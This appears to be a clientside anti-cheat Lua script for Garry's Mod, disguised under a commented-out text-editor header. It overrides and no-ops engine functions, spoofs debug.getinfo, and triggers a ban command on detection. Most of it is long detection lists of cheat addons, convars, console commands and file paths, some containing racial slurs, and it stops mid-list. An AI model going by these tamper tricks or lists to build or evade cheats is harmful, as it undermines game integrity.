/******************************************************************************
  Expression 2 Text Editor for Garry's Mod
  Andreas "Syranide" Svensson, me@syranide.com
\******************************************************************************

local wire_expression2_autocomplete_controlstyle = CreateClientConVar( "wire_expression2_autocomplete_controlstyle", "0", true, false )

local EDITOR = {}

function EDITOR:Init()
	self:SetCursor("beam")

	self.Rows = {""}
	self.Caret = {1, 1}
	self.Start = {1, 1}
	self.Scroll = {1, 1}
	self.Size = {1, 1}
	self.Undo = {}
	self.Redo = {}
	self.PaintRows = {}

	self.Blink = RealTime()

	self.ScrollBar = vgui.Create("DVScrollBar", self)
	self.ScrollBar:SetUp(1, 1)

	self.TextEntry = vgui.Create("TextEntry", self)
	self.TextEntry:SetMultiline(true)
	self.TextEntry:SetSize(0, 0)

	self.TextEntry.OnLoseFocus = function (self) self.Parent:_OnLoseFocus() end
	self.TextEntry.OnTextChanged = function (self) self.Parent:_OnTextChanged() end
	self.TextEntry.OnKeyCodeTyped = function (self, code) self.Parent:_OnKeyCodeTyped(code) end

	self.TextEntry.Parent = self

	self.LastClick = 0
end

function EDITOR:GetParent()
	return self.parentpanel
end

function EDITOR:RequestFocus()
	self.TextEntry:RequestFocus()
end

function EDITOR:OnGetFocus()
	self.TextEntry:RequestFocus()
end

function EDITOR:CursorToCaret()
	local x, y = self:CursorPos()

	x = x - (self.FontWidth * 3 + 6)
	if x < 0 then x = 0 end
	if y < 0 then y = 0 end

	local line = math.floor(y / self.FontHeight)
	local char = math.floor(x / self.FontWidth+0.5)

	line = line + self.Scroll[1]
	char = char + self.Scroll[2]

	if line > #self.Rows then line = #self.Rows end
	local length = string.len(self.Rows[line])
	if char > length + 1 then char = length + 1 end

	return { line, char }
end*/


--[[
===== HAC, CLIENTSIDE =====
	If you can read this, GTFO my dua cache!
	This wasn't made to stop everyone, only n00bs who download aimbots from garrysmod.org
	and funny business with convar forcing etc.
	
	If you actually *did* find this, add me on steam (steamcommunity.com/id/MFSiNC)
	Got any ideas on how to make this better? got anything i should to add? (aimbots/hacks etc)
	
	Inb4 "clientside AC == shit", it's banned over 200 players so far.
	
	--HeX
]]

if !CLIENT then return end
local LoadTime			= CurTime()
HACInstalled			= 1
local HACLength			= 0

local EVERYTIME			= 100
local SPAWNTIME			= 75
local BanCommand		= "banme"

local DEBUG				= true --false

local NotINC		= include
local NotRQ			= require

local usermessage	= NotRQ("usermessage") --Thanks FapHack!
NotRQ("concommand")
NotRQ("hook")
NotRQ("timer")
NotRQ("cvars")
NotRQ("datastream")

local os			= os
local gamemode		= gamemode
local hook			= hook
local timer			= timer
local math			= math
local string		= string
local table			= table
local MsgN			= MsgN
local Msg			= Msg
local print			= print
local Format		= Format
local type			= type
local pairs 		= pairs
local IsValid		= IsValid
local tostring		= tostring
local tonumber		= tonumber
local datastream	= datastream

local NotSTS		= datastream.StreamToServer	
local NotCCA		= concommand.Add
local NotHA			= hook.Add
local NotHR			= hook.Remove
local NotHGT		= hook.GetTable
local NotCCC		= CreateClientConVar
local NotGCV		= GetConVar
local NotGCS		= GetConVarString
local NotGCN 		= GetConVarNumber
local NotRCC		= RunConsoleCommand
local NotECC		= engineConsoleCommand
local NotGAL		= GetAddonList
local NotGAI		= GetAddonInfo
local NotCAC		= cvars.AddChangeCallback
local NotFFIL		= file.FindInLua
local NotFF			= file.Find
local NotFD			= file.Delete
local NotFR			= file.Read
local NotFXE		= file.Size
local NotTS			= timer.Simple
local NotTC			= timer.Create
local NotTIT		= timer.IsTimer
local NotRE			= rawequal
local NotRG			= rawget

local NotFMT		= FindMetaTable
local NotIV			= _R["Entity"]["IsValid"]
local NotGBP		= _R["Entity"]["GetBonePosition"]
local NotACH		= _R["Entity"]["LookupAttachment"]
local NotRS			= _R["bf_read"]["ReadString"]
local NotPCC		= _R["Player"]["ConCommand"]

Msg("\n")
MsgN("///////////////////////////////////")
MsgN("//        HeX's Anti-Cheat       //")
MsgN("///////////////////////////////////")

MsgN("//  Squeezing limes..            //")
local RandomCharsHere	= tostring(os.date("%d%m%y"))..string.char(math.random(65, 90), math.random(65, 90), math.random(65, 90), math.random(65, 90), math.random(65, 90))
local KR30HA			= false
local KR30HR			= false
local KR30HGT			= false
local KR30CMD			= false
local KR30SVC			= false
local KR30HTS			= false
local KR30HFR			= false
local KR30NBM			= false
local KR30CFS			= false
local KR30FFIL			= false
local KR30FF			= false
local KR30FR			= false
local KR30GCV			= false
local KR30GCS			= false
local KR30GCN			= false
local KR30RCC			= false
local KR30CCA			= false
local KR30RQ			= false
local KR30RGGCV			= false
local KR30RGGCS			= false
local KR30RGGCN			= false
local KR30RGRCC			= false
local KR30RGECC			= false
local KR30ECC			= false
local RCCAlreadyDone	= false
local StartKR30			= false
local AddonsTAB			= {}
local AddonsKWTAB		= {}
local CVTab				= {}
local RCCTab			= {}
local CMDTab			= {}
local BadLuaFiles		= {}
local BadData			= {}
local BadFiles			= {}
local NewGAL			= {}
local Booty				= {}
local ToSteal			= {}

local IsDev = {
	["STEAM_0:0:17809124"]	= true, --HeX
	["STEAM_0:0:25307981"]	= true, --Blackwolf
}

MsgN("//  Pissing in the sandbox..     //")
usermessage.Hook("HAC.BanCommand", function(um) --Thanks ac_ob1!
	BanCommand = NotRS(um) --um:ReadString()
end)

MsgN("//  Setting up the bomb..        //")
function GMGiveRanks(found)
	if NotIV(LocalPlayer()) then
		NotRCC(BanCommand, found, "User")
	end
end
local GMGiveRanks = GMGiveRanks
GMG = GMGiveRanks

MsgN("//  WARNING: Naquadah level low  //")
if DEBUG then
	SPAWNTIME = 3
	EVERYTIME = 4
end

MsgN("//  *hourglass on a spring*      //")
NotTC(RandomCharsHere.."4", 4, 0, function()
	RCCAlreadyDone	= false
	PCCAlreadyDone	= false
end)

MsgN("//  Mixing sugar with the sand.. //")
local DGETable = {}
DGETable["short_src"]="addons\\faphack\\lua\\faphack\\faphack.lua"
DGETable["short_src"]="addons\\faphack\\lua\\faphack\\faphack.lua"
DGETable["short_src"]="addons\\faphack\\lua\\faphack\\faphack.lua"

debug.getinfo = function(thr,func)
	return DGETable
end

local function Useless() end
RunString		= Useless
Runstring		= Useless
CompileString	= Useless
CompileFile		= Useless
Compilestring	= Useless
WFC111255 		= Useless
loadstring		= Useless
LoadString		= Useless
setfenv			= Useless
getfenv			= Useless
xpcall			= Useless

--[[ --breaks ULX
rawset			= Useless
rawget			= Useless
]]


local function NotTHV(tab,val)
	for k,v in pairs(tab) do
		if (v == val) then return true end
	end
	return false
end

local function NewConCommand(ent,cmd,stuff)
	if ( (not IsDev[LocalPlayer():SteamID()]) and RCCTab[string.lower(tostring(cmd))] ) then
		if not PCCAlreadyDone then
			PCCAlreadyDone = true
			GMGiveRanks("PCC="..tostring(cmd))
		end
		return
	end
	
	if not (ent and NotIV(ent)) then return end
	return NotPCC(ent,cmd,stuff)
end

_R["Player"]["ConCommand"] 	= NewConCommand
_R.Player.ConCommand		= NewConCommand
NotFMT("Player").ConCommand	= NewConCommand


function RunConsoleCommand(...) --Thanks XAC
	local RCCArgs = {...}
	if RCCTab[string.lower(tostring(RCCArgs[1]))] then
		if not RCCAlreadyDone then
			RCCAlreadyDone = true
			GMGiveRanks("RCC="..tostring(RCCArgs[1]))
		end
		return
	end
	return NotRCC(...)
end
local NewRCC = RunConsoleCommand

MsgN("//  Cup of beer heading south..  //")



AddonsTAB = {
	"FapHack",
	"Hermes",
	"SethHack",
	"BaconBot",
	"Tee Bot Release",
	"Asb",
	"Eusion's Script Package",
	"Trooper Hack",
	"[GzF]Hacks",
	"[GzF]Hacks ViP Beta V1.02",
	"[GzF] Aimbot",
	"[GzF]Hacks V2",	
	"[THEODORE]",
	"Simple Hack",
	"Name Generator",
	"BaconBot_V4",
	"bbot",
}



AddonsKWTAB = {
	"hack",
	"exploit",
	--"block",
	"convar",
	"cvar",
	"hax",
	"h4x",
	--"force",
	"cheat",
	"baconbot",
	"hades",
	"hermes",
	"helix",
	"JonSuite",
	"spam",
	"bypass",
	"luamd5",
	"aimbot",
	"spread",
	"secret",
	"unblock",
	--"se2",
	"scriptenforcer",
}



CVTab = {
	"hermes_misc_antiaimr_antiaim",
	"hermes_misc_antiaimy_antiaim",
	"hermes_misc_antiaimp_antiaim",
	"hermes_misc_antiaimduck_antiaim",
	"hermes_misc_antiaimrandom_antiaim",
	"hermes_misc_antiaim_antiaim",
	"hermes_misc_zoomamount_zoom",
	"hermes_misc_zoomontrigger_zoom",
	"hermes_misc_zoomonaim_zoom",
	"hermes_misc_zoomalways_zoom",
	"hermes_misc_zoom_zoom",
	"hermes_misc_speedhackspeed_speedhack",
	"hermes_misc_speedhack_speedhack",
	"hermes_misc_particles_globals",
	"hermes_misc_fullbrightg_globals",
	"hermes_misc_radarradius_radar",
	"hermes_misc_radarspin_radar",
	"hermes_misc_radarname_radar",
	"hermes_misc_radar_radar",
	"hermes_misc_crosshairlength_crosshair",
	"hermes_misc_crosshairgap_crosshair",
	"hermes_misc_crosshair_crosshair",
	"hermes_misc_crosshairtype_crosshair",
	"hermes_misc_ulxantigag_misc",
	"hermes_misc_autopistol_misc",
	"hermes_misc_bunnyhop_misc",
	"hermes_misc_namesteal_misc",
	"hermes_esp_asusval_asus",
	"hermes_esp_asusmdl_asus",
	"hermes_esp_asus_asus",
	"hermes_esp_visiblechams_chams",
	"hermes_esp_fullbright_chams",
	"hermes_esp_walltype_chams",
	"hermes_esp_vehiclese_entities",
	"hermes_esp_ragdollse_entities",
	"hermes_esp_weaponse_entities",
	"hermes_esp_entityliste_entities",
	"hermes_esp_enablee_entities",
	"hermes_esp_boxn_npcs",
	"hermes_esp_enablen_npcs",
	"hermes_esp_adminlist_players",
	"hermes_esp_friendsmark_players",
	"hermes_esp_barrel_players",
	"hermes_esp_weapon_players",
	"hermes_esp_health_players",
	"hermes_esp_name_players",
	"hermes_esp_enemyonly_players",
	"hermes_esp_enable_players",
	"hermes_esp_optical_players",
	"hermes_esp_fadelength_general",
	"hermes_esp_maxshow_general",
	"hermes_esp_enablefade_general",
	"hermes_esp_font_general",
	"hermes_aim_novisspread_accuracy",
	"hermes_aim_norecoil_accuracy",
	"hermes_aim_nospread_accuracy",
	"hermes_aim_togglename_hud",
	"hermes_aim_toggle_hud",
	"hermes_aim_triggerdistance_triggerbot",
	"hermes_aim_triggernospread_triggerbot",
	"hermes_aim_triggerkey_triggerbot",
	"hermes_aim_triggerbot_triggerbot",
	"hermes_aim_ignorevehicle_targeting",
	"hermes_aim_ignoreghost_targeting",
	"hermes_aim_ignoretraitor_targeting",
	"hermes_aim_ignoreteam_targeting",
	"hermes_aim_ignoresteam_targeting",
	"hermes_aim_ignoreadmin_targeting",
	"hermes_aim_targetnpc_targeting",
	"hermes_aim_targetplayer_targeting",
	"hermes_aim_friendslist_targeting",
	"hermes_aim_predictply_aimbot",
	"hermes_aim_predicttar_aimbot",
	"hermes_aim_smoothaimspeed_aimbot",
	"hermes_aim_fov_aimbot",
	"hermes_aim_offset_aimbot",
	"hermes_aim_disableafterkill_aimbot",
	"hermes_aim_holdtarget_aimbot",
	"hermes_aim_smoothaim_aimbot",
	"hermes_aim_velocitychecks_aimbot",
	"hermes_aim_loscheck_aimbot",
	"hermes_aim_silentaim_aimbot",
	"hermes_aim_autoshoot_aimbot",
	"hermes_aim_prediction_aimbot",
	"hermes_aim_aimmode_aimbot",
	"hermes_aim_aimtype_aimbot",
	"hermes_load",
	"hermes_host_timescale",
	"hermes_pato",
	"hermes_sv_cheats",
	"hermes_mat_fullbright",
	"hermes_r_drawparticles",
	"seb_enable",
	"sh_enabled",
	"SethHack_allow_cheats_default",
	"SethHack_ff",
	"SethHack_Chams",
	"SethHack_NPConly",
	"SethHack_Entonly",
	"SethHack_Plyonly",
	"SethHack_LockY", 
	"SethHack_Enemy_Compensation",
	"SethHack_Me_Compensation",
	"SethHack_TMW",
	"SethHack_Ignore_SteamFriends",
	"SethHack_Ignore_Admins",
	"SethHack_Trigger_Bot",
	"SethHack_RestrictFOV_Value",
	"SethHack_AimSmooth",
	"SethHack_Mode",
	"SethHack_espplayeron",
	"SethHack_espunhideon",
	"SethHack_espmode",
	"SethHack_espcross",
	"SethHack_espitemon", 
	"SethHack_espvehicleon",
	"SethHack_espnpcon",
	"SethHack_espweaponon",
	"SethHack_esptrans",
	"SethHack_adminlist",
	"SethHack_drawclassname",
	"SethHack_showcmds",
	"SethHack_blacklistcmds",
	"SethHack_showumsgs",
	"SethHack_autoreload",
	"SethHack_crosshair",
	"SethHack_chams2",
	"SethHack_bhop",
	"SethHack_spinbot",
	"SethHack_chatspam",
	"SethHack_chatspam_interval",
	"SethHack_enable_filelogs",
	"SethHack_enable_sendlualog",
	"SethHack_enable_iplogs",
	"SethHack_enable_dslogs",
	"SethHack_speedfactor",
	"SethHack_gamemodeview",
	"SethHack_clientnoclip",
	"SethHack_always_nospread",
	"Ink_Esp_Admin",
	"Ink_Bhop",
	"Ink_Trigger",
	"Ink_TTT",
	"Ink_AntiGag",
	"Ink_Aimbot_IgnoreSteam",
	"Ink_Aimbot_Friendlyfire",
	"Ink_Aimbot_IgnoreAdmins",
	"Ink_SmoothAim_Enabled",
	"Ink_Smooth_Speed",
	"Aimbot_Offset",
	"Ink_Aimbot_Norecoil",
	"Ink_Key",
	"Ink_Func",
	"Ink_AimKeySave",
	"Ink_MenuKeySave",
	"Ink_PropKeySave",
	"ihpublicaimbot_enabled",
	"fap_aimbot_toggle",
	"Nishack_Triggerbot_Enabled",
	"sh_wallhack_dist",
	"pb_aim_trigger",
	"TB_BlockRCC",
	"trooper_aimbot",
	"trooper_autoshoot",
	"trooper_norecoil",
	"pb_load",
	"bc_norecoil",
	"bc_bouncy",
	"wots_buddy_attack",
	"wots_aimbot_teammode",
	"wots_aimbot_mouselock",
	"fap_aim_checkpartialhits",
	"fap_aim_enabled",
	"fap_aim_friendlyfire",
	"fap_aim_targetnpcs",
	"fap_aim_autofire",
	"fap_aim_autoreload",
	"fap_aim_bonemode",
	"fap_aim_targetfriends",
	"fap_aim_targetsteamfriends",
	"fap_aim_targetmode",
	"fap_aim_nospread",
	"fap_aim_maxdistance",
	"fap_aim_targetadmins",
	"fap_aim_antisnap",
	"fap_aim_norecoil",
	"fap_aim_antisnapspeed",
	"fap_aim_maxangle",
	"fap_aim_snaponfire",
	"fap_aim_snaponfiretime",
	"fap_aim_onlytargettraitors",
	"fap_aim_velocityprediction",
	"fap_aim_checknpcrelationship",
	"fap_checkforupdates",
	"fap_shouldload",
	"fap_enablekeybinding",
	"fap_bunnyhop",
	"fap_bunnyhopspeed",
	"fap_dontchecklos",
	"fap_alwaysloadhardcopy",
	"fap_ucmdfire",
	"host_timescale",
	"sv_cheats",
	"host_framerate",
	"net_blockmsg",
}



RCCTab = {
	["+attack"]	= true,
	--["+jump"]	= true,
}



CMDTab = {
	"sb_toggle",
	"sh_menu",
	"sh_togglemenu",
	"+sh_triggerbot",
	"sh_print_traitors",
	"+sh_bhop",
	"+li_bhop",
	"SE_ByPass",
	"se_on",
	"+Aim",
	"SpamTime",
	"SethHack_panic",
	"SethHack_lua_run",
	"SethHack_lua_openscript",
	"+SethHackToggle",
	"+SethHack_Menu",
	"deathrun_qq",
	"+SethHack_Speed",
	"SethHack_ff_toggle",
	"SethHack_wallhack_wire",
	"SethHack_wallhack_player",
	"SethHack_Clear_All",
	"SethHackToggle",
	"SethHack_triggerbot_toggle",
	"SethHack_AddNPCfriend",
	"SpamMenu",
	"Inkbot_Crack",
	"Ink_LoadMenu",
	"+Propkill",
	"+Ink_Aim",
	"Ink_menu",
	"ihpublicaimbot_reload",
	"ihpublicaimbot_toggle",
	"+ihaimbot",
	"ihpublicaimbot_menu",
	"lagon",
	"lagoff",
	"fap_aimbot_toggle",
	"+Nis_Menu",
	"+sh_bhop",
	"pb_aim_trigger",
	"pb_load",
	"+TB_Aim",
	"+TB_Menu",
	"+TB_RapidFire",
	"+TB_Speed",
	"Spam_Props-V2",
	"Spam_Chat-v2",
	"pb_menu",
	"+bc_aimbot",
	"-bc_aimbot",
	"+bc_spamprops",
	"bc_ips",
	"+bc_speedshoot",
	"bc_reload",
	"bc_unload",
	"wots_attack",
	"_fap_reload",
	"SE_AddFile",
	"SE_RemoveFile",
	"SE_LoadScripts",
	"+pb_aim",
	"pb_menu",
	"Spam_Props",
	"Spam_Chat",
	"+li_aim",
	"+li_menu",
	"li_menu",
	"+sh_menu",
	"+Mawpos",
	"gzfaimbot_reload",
	"gzfaimbot_toggle",
	"gzfaimbot_enabled",
	"asb_base_reload",
	"asb_base_unload",
	"+shenbot_aimbot",
	"shenbot_menu",
	"shenbot_bunnyhoptoggle",
	"-shenbot_aimbot",
	"SpinBot_on",
	"aimbot_off",
	"_aimbot",
	"lua_dofile_cl",
	"lua_dostring_cl",
	"ph0ne_aim",
	"ph0ne_aimcancel",
	"ph0ne_autoshoot",
	"+trooper_menu",
	"BMpublicaimbot_reload",
	"BMpublicaimbot_toggle",
	"+BMaimbot",
	"BMpublicaimbot_menu",
	"spamchat",
	"_fap_menu_reload",
	"rs",
	"sh_triggerbot",
	"sh_showips",
	"+sh_speed",
	"+sh_aim",
	"sh_toggleaim",
	"helix_chatspammer",
	"helix_undo",
	"helix_propspam",
	"helix_admins",
	"helix_rpnamespammer",
	"+helix_speed",
	"helix_crypto_binary",
	"helix_forcerandomname_on",
	"helix_forcerandomname_off",
	"helix_troll",
	"+helix_aim",
	"helix_cvarmenu",
	"formatlaser",
	"+Helix_Menu",
	"helix_reload",
	"helix_propspammer2",
	"helix_barrelbomb",
	"helix_unload",
	"helix_speed",
	"helix_blocklua",
	"helix_propspam_mdl",
	"helix_aim_bone",
	"helix_aim_crosshair",
	"helix_aim_fov",
	"helix_aim_los",
	"helix_aim_norecoil",
	"helix_aim_players",
	"helix_aim_shoot",
	"helix_aim_team",
	"helix_aim_trigger",
	"sh_luarun",
	"h_name",
	"+bb_menu",
	"bb",
	"ForceLaunch_BB",
	"jonsuite_unblockx",
	"bacon_lua_openscript",
	"+fox_aim",
	"hera_runstring",
	"aa_toggle",
	"Bacon_TriggerBotDelay",
	"Bacon_load",
	"bacon_chatspam",
	"bacon_namechange",
	"bacon_chatspam_interval",
	"bacon_norecoil",
	"Bacon_AntiSnap",
	"bacon_autoreload",
	"AGT_AutoshootToggle",
	"AGT_AimBotToggle",
	"AGT_RandomName",
	"nbot_aimfixer",
	"nbot_speedoffset",
	"nbot_UseSelectedPerson",
	"nbot_autoshoot",
	"fap_enablekeybinding",
	"fap_bind",
	"fap_unbind",
	"lua_se2_load",
	"ah_cheats",
	"ah_changer",
	"ah_speed",
	"ah_aimbot_friends",
	"ah_aimbot",
	"ah_hooks",
	"ah_hookhide",
	"ah_name",
	"ah_antihook",
	"ah_reload",
	"ah_timestop",
	"setconvar",
	"fap_menu",
	"fap_checkforupdates",
	"fap_aim",
	"+fap_aim",
	"fap_aim_toggle",
	"lua_openscript_cl2",
	"raidbot_predictcheck",
	"aa_enabled",
	"BMaimbot",
	"+BMaimbot",
	"aimbot_headshots_on",
	"CBon_Reload_Script",
	"+CBon_menu",
	"ah_chatspammer",
	"ah_spammer",
	"ah_reload",
	"+ah_menu",
	"+nbot_options",
	"sm_fexec",
	"GAT_RandomName",
	"name_menu",
	"namechanger_on",
	"cl_name",
	"+wots_toggleimmunity",
	"send_file",
	"Bacon_Reload_Script",
	"fap_reload",
	"download_file",
	"upload_file",
	"plugin_load",
	"sethhack_load",
	"st_jumpspam",
	"force_cvar",
	"cl_docrash",
	"_fap_initshit",
	"SE_AddFile",
	"SE_RemoveFile",
	"SE_LoadScripts",
	"+namechanger",
	"RandomNCOn",
	"BlankNCON",
	"PsaySpamOn",
	"GayOn",
	"RatingSpammerOn",
	"+jbf_scan",
	"kennykill",
	"kenny_team",
	"kenny_bodyshots",
	"+kenny",
	"kenny_tagasshole",
	"kenny_addhit",
	"Kenny_noclip",
	"bacon_toggle",
	"Bacon_EntTriggerBot",
	"Bacon_Reload_Script",
	"+wots_spinhack",
	"wots_spinhack",
	"wire_button_model",
	"lol_togglestick",
	"lol_name",
	"lol_copy",
	"lol_fuckthis",
	"lol_barrel",
	"lol_setchat",
	"lol_chat",
	"lol_help",
	"lol_admins",
	"lol_adminalert",
	"lol_cancel",
	"lol_aim",
	"lol_headshot",
	"lol_teamshot",
	"wots_namecracker_menu",
	"wots_namecracker_on",
	"wots_namecracker_off",
	"wots_crash",
	"wots_lag_on",
	"wots_lag_off",
	"speedhack_speed",
	"SetCV",
	"+wowspeed",
	"+gofast",
	"+goslow",
	"JBF_off",
	"JBF_on",
	"JBF_headshots_off",
	"JBF_headshots_on",
	"JBF_enemysonly_on",
	"JBF_enemysonly_off",
	"JBF_playersonly_on",
	"JBF_playersonly_off",
	"_JBF_lagcompensation",
	"JBF_lagcompensation",
	"JBF_suicidehealth",
	"JBF_offset",
	"+BUTTFUCK",
	"entx_spazon",
	"entx_spazoff",
	"entx_setvalue",
	"+buttfuck",
	"fap_aim_enabled",
	"fap_aim_friendlyfire",
	"fap_aim_targetnpcs",
	"fap_aim_autofire",
	"fap_aim_autoreload",
	"fap_aim_bonemode",
	"fap_aim_targetfriends",
	"fap_aim_targetsteamfriends",
	"fap_aim_targetmode",
	"fap_aim_nospread",
	"fap_aim_maxdistance",
	"fap_aim_targetadmins",
	"fap_aim_antisnap",
	"fap_aim_norecoil",
	"fap_aim_antisnapspeed",
	"niggeron",
	"niggerff",
	"niggerfl",
	"niggersz",
	"niggernpc",
	"niggerw",
	"niggeri",
	"niggershd",
	"niggermxsh",
	"niggershit",
	"niggersd",
	"NameGenDerma",
	"+elebot",
	"+leetbot",
	"elebot_offset",
	"leetbot_offset",
	"elebot_minview",
	"leetbot_minview",
	"elebot_maxview",
	"leetbot_maxview",
	"elebot_boxsize",
	"leetbot_boxsize",
	"elebot_simplecolors",
	"leetbot_simplecolors",
	"elebot_targetteam",
	"leetbot_targetteam",
	"elebot_showadmin",
	"leetbot_showadmin",
	"elebot_filledbox",
	"leetbot_filledbox",
	"wots_attack",
	"+wots_menu",
	"wots_menu",
	"wots_megaspam",
	"wots_namegen_on",
	"wots_namegen_off",
	"name_change",
	"change_name",
	"name_changer",
	"+name_changer",
	"+Bacon_Menu",
	"+BaconToggle",
	"BaconToggle",
	"Bacon_triggerbot_toggle",
	"+Bacon_triggerbot_toggle",
	"Bacon_FF_Toggle",
	"aimbot_scan",
	"+aimbot_scan",
	"+aimbot",
	"aimbot",
	"entx_spazon",
	"entx_spazoff",
	"_aimbot",
	"_aimbot_headshots",
	"aimbot_offset",
	"entx_run1",
	"entx_run2",
	"entx_run3",
	"entx_run4",
	"entx_traceget",
	"entx_camenable",
	"+slobpos",
	"Bacon_Trigger_Bot",
	"+Bacon_Trigger_Bot",
	"Bacon_Ignore_SteamFriends",
	"Bacon_Mode",
	"gzfaimbot_reload",
	"gzfaimbot_toggle",
	"+gzfaimbot",
	"gzfaimbot",
	"gzfaimbot_menu",
	"at_autoaim_on",
	"at_autoaim_off",
	"at_changer_on",
	"at_changer_off",
	"at_norecoil_on",
	"at_norecoil_off",
	"at_menu",
	"at_autoshoot_on",
	"at_autoshoot_off",
	"aa_reload",
	"aa_toggle",
	"+aa",
	"aa_menu",
	"+Mawpos",
	"+nBot",
	"+nbot_Options",
	"nbot_Options",
	"aimbot_on",
	"aimbot_hitbox",
	"aimbot_target_teamates",
	"aimbot_target_closest",
	"aimbot_target_clear",
	"+asb_bot",
	"asb_bot",
	"asb_options",
	"+asb",
	"asb",
	"asb_unload",
	"asb_reload",
	"asb_shoot",
	"+entinfo",
	"entinfo_target",
	"asb_shoot",
	"asb_nospread",
	"asb_players",
	"entinfo_targetplayer"
}



BadLuaFiles = {
	--hermes
	"includes/modules/*hermes*.dll",
	"menu_plugins/*hermes*.lua",
	"includes/enum/*hermes*.lua",
	"vgui/*hermes*.lua",
	"autorun/*hermes*.lua",
	"autorun/client/*hermes*.lua",	
	"*hermes*.lua",
	--hermes:iplogger
	"menu_plugins/*iplogger*.lua",
	"includes/enum/*iplogger*.lua",
	"vgui/*iplogger*.lua",
	"autorun/*iplogger*.lua",
	"autorun/client/*iplogger*.lua",
	"*iplogger*.lua",
	
	--FapHack
	"includes/modules/*faphack*.dll",
	"menu_plugins/*faphack*.lua",
	"includes/enum/*faphack*.lua",
	"vgui/*faphack*.lua",
	"autorun/*faphack*.lua",
	"autorun/client/*faphack*.lua",	
	"*faphack*.lua",
	"FapHack/*.lua",
	
	--trooper
	"menu_plugins/*trooper*.lua",
	"includes/enum/*trooper*.lua",
	"vgui/*trooper_*.lua",
	"autorun/*trooper_*.lua",
	"autorun/client/*trooper_*.lua",	
	"*trooper_*.lua",
	--PB
	"menu_plugins/*pb_*.lua",
	"includes/enum/*pb_*.lua",
	"vgui/*pb_*.lua",
	"autorun/*pb_*.lua",
	"autorun/client/*pb_*.lua",	
	"*pb_*.lua",
	--INK
	"menu_plugins/INK.lua",
	"includes/enum/INK.lua",
	"vgui/INK.lua",
	"autorun/INK.lua",
	"autorun/client/INK.lua",	
	"INK.lua",
	
	--autoaim
	"autorun/AutoAim.lua",
	"autorun/client/AutoAim.lua",	
	"AutoAim.lua",
	
	--MintyScript
	"autorun/MintyScript.lua",
	"autorun/client/MintyScript.lua",	
	"MintyScript.lua",
	
	--NeonHack
	"includes/modules/*neon*.dll",
	"autorun/[NH]Core.lua",
	"autorun/client/[NH]Core.lua",	
	"[NH]Core.lua",
	"autorun/[NH]Loader.lua",
	"autorun/client/[NH]Loader.lua",	
	"[NH]Loader.lua",
	
	--asb
	"autorun/asb.lua",	
	"autorun/client/asb.lua",
	"asb.lua",
	"autorun/_TEMPLATE.lua",	
	"autorun/client/_TEMPLATE.lua",
	"_TEMPLATE.lua",
	"autorun/asb_base.lua",
	"autorun/client/asb_base.lua",
	"asb_base.lua",
	
	--Baconbot
	"includes/modules/*testbot*.dll",
	"includes/modules/*bbot*.dll",	
	"stuff/Clock.lua",
	"stuff/*bot*.lua",
	--v3
	"menu_plugins/*bbv3*.lua",
	"includes/enum/*bbv3*.lua",
	"vgui/*bbv3*.lua",
	"autorun/*bbv3*.lua",
	"autorun/client/*bbv3*.lua",
	"*bbv3*.lua",
	--v4
	"menu_plugins/*bbv4*.lua",
	"includes/enum/*bbv4*.lua",
	"vgui/*bbv4*.lua",
	"autorun/*bbv4*.lua",
	"autorun/client/*bbv4*.lua",
	"*bbv4*.lua",
	
	--hades
	"includes/modules/*hades*.dll",
	"menu_plugins/*hades*.lua",
	"includes/enum/*hades*.lua",
	"vgui/*hades*.lua",
	"autorun/*hades*.lua",
	"autorun/client/*hades*.lua",
	"*hades*.lua",
	"hades/*.lua",
	"hades/core/*.lua",
	
	--helix
	"includes/modules/*helix*.dll",
	"includes/modules/gm_p_*.dll",
	"includes/modules/gmcl_p_*.dll",
	"includes/modules/gm_p_base.dll",
	"includes/modules/gm_p_concmd.dll",
	"includes/modules/gm_p_cvar.dll",
	"includes/modules/gm_p_forcevar.dll",
	"includes/modules/gmcl_p_bypass.dll",
	"includes/modules/gmcl_p_misc.dll",
	"includes/modules/gmcl_p_umsg.dll",
	"menu_plugins/*helix*.lua",
	"includes/enum/*helix*.lua",
	"vgui/*helix*.lua",
	"autorun/*helix*.lua",
	"autorun/client/*helix*.lua",
	"*helix*.lua",
	"helix/*.lua",
	"helix/core/*.lua",
	
	--hera
	"includes/modules/*hera*.dll",
	"menu_plugins/*hera*.lua",
	"includes/enum/*hera*.lua",
	"vgui/*hera*.lua",
	"autorun/*hera*.lua",
	"autorun/client/*hera*.lua",
	"*hera*.lua",
	"hera/*.lua",
	"hera/core/*.lua",
	
	--THEODORE
	"menu_plugins/[THEODORE].lua",
	"includes/enum/[THEODORE].lua",
	"vgui/[THEODORE].lua",
	"autorun/[THEODORE].lua",
	"autorun/client/[THEODORE].lua",
	"[THEODORE].lua",	
	--JonSuite
	"includes/modules/*JonSuite*.dll",
	"JonSuite/Hacks/*.lua", 
	"JonSuite/*.lua",
	
	--name
	"autorun/Adv.Name.lua",
	"autorun/client/Adv.Name.lua",
	"Adv.Name.lua",
	"autorun/name_new.lua",	
	"autorun/client/name_new.lua",
	"name_new.lua",
	"autorun/namescript.lua",
	"autorun/client/namescript.lua",
	"namescript.lua",
	"autorun/randomname.lua",
	"autorun/client/randomname.lua",
	"randomname.lua",
	--namehack:namechange
	"autorun/*namechange*.lua",
	"autorun/client/*namechange*.lua",
	"*namechange*.lua",
	
	--random
	"autorun/client/bob_saget_firing_squad.lua",
	"autorun/bob_saget_firing_squad.lua",
	"autorun/client/ms_aimboat.lua",
	"autorun/ms_aimboat.lua",
	"autorun/I_laik_being_dum.lua",
	"autorun/client/I_laik_being_dum.lua",
	"autorun/waroftheservers.lua",
	"autorun/client/waroftheservers.lua",
	"autorun/hai.lua",
	"autorun/client/hai.lua",	
	"hai.lua",
	"autorun/fuckoff.lua",
	"autorun/client/fuckoff.lua",
	"fuckoff.lua",
	"autorun/AGT.lua",
	"autorun/client/AGT.lua",
	"AGT.lua",
	--seth
	"shrun/*.lua",
	"lua/shrun/*.lua",
	"autorun/shrun/*.lua",
	"autorun/client/shrun/*.lua",
	"dev/*bot*.lua",
	"dev/bbv3.lua",
	"dev/bbv4.lua",
	"dev/*hack*.lua",
	"dev/*crack*.lua",
	"dev/*exploit*.lua",
	"dev/*block*.lua",
	"dev/*convar*.lua",
	"dev/*cvar*.lua",
	"dev/*recoil*.lua",
	"dev/*hax*.lua",
	"dev/*h4x*.lua",
	"dev/*force*.lua",
	"dev/*cheat*.lua",
	"dev/*spam*.lua",
	"dev/*bypass*.lua",
	"dev/*troll*.lua",
	--BCScripts
	"scripts/*bot*.lua",
	"scripts/bbv3.lua",
	"scripts/bbv4.lua",
	"scripts/*hack*.lua",
